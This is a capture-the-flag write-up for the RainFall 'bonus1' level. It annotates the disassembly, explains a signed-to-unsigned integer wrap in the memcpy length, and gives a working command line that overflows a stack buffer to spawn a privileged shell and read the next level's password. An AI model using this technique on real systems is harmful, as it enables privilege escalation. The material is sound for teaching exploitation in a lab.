The program segfaults with no arguments and nothing hapens with arguments.
```
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax - eax = argv
   0x08048430 <+12>:	add    $0x4,%eax - argv[1]
   0x08048433 <+15>:	mov    (%eax),%eax - deref eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   <12> - <20>: atoi(argv[1]);
   0x0804843d <+25>:	mov    %eax,0x3c(%esp) - 0x3c(%esp) = atoi
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   <12> - <41>: if (atoi(argv[1]) > 9) return 1;
   0x0804844f <+43>:	mov    0x3c(%esp),%eax - eax = atoi
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx - ecx = eax * 4
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   <54> - <62>: edx = argv[2]
   0x08048464 <+64>:	lea    0x14(%esp),%eax - load 40 bytes (0x3c - 0x14) in eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   <68> - <79>: memcpy(atoi * 4, argv[2], local var)
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   if (atoi == 0x574f4c46)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   <82> - <117>: execl("/bin/sh", "sh", 0); 
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret  
```
We have our target, we just need the condition
```
(gdb) p (char[4]) 0x574f4c46
$9 = "FLOW"
```
So we have to set the memory address of the atoi var to represent represent something like `*(int *)"FLOW"`.
Looking at out stack we see that our local variable is placed 40 bytes from our atoi variable. So if we completly fill that variable in wich we copy, we can overwrite the atoi value.
```
(gdb) run -10 AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus1/bonus1 -10 AAAA

Breakpoint 1, 0x08048473 in main ()
(gdb) i r
eax            0xbffff604	-1073744380
ecx            0xffffffd8	-40
edx            0xbffff83b	-1073743813
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff638	0xbffff638
esi            0x0	0
edi            0x0	0
eip            0x8048473	0x8048473 <main+79>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0xb7f62403 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) i r
eax            0xbfffffd7	-1073741865
ecx            0xfffff7bc	-2116
edx            0xbffffda0	-1073742432
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff5e8	0xbffff5e8
ebp            0xbffff638	0xbffff638
esi            0x0	0
edi            0x0	0
eip            0xb7f62403	0xb7f62403
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```
An interesting behaviour we see is that the program segfaults when we send a negative number, why is that?
`void *memcpy(size_t n; void dest[restrict n], const void src[restrict n], size_t n);`
On a 32 bit system, size_t is an unsigned integer and when a signed value is sent, the computer reinterprets those bits.
```
(gdb) x /s -40
0xffffffd8:	 <Address 0xffffffd8 out of bounds>
(gdb) p /d 0xffffffd8
$2 = 4294967256
```
We can see that -40(argv\[1] = -10) will wrap around and be interpreted as 4294967256, eventualy trying to copy over 4gb of data.
```
(gdb) p /u 4294967256 + 40
$6 = 0 (4294967296) - max 32 bit value
```
No we can see that ading those 40 bytes to our value will get us back to 0. 
```
res * 4 = 44(buffer size + addr) - 4294967296
res = -1073741813
```

```
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A" * 40 + "FLOW"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

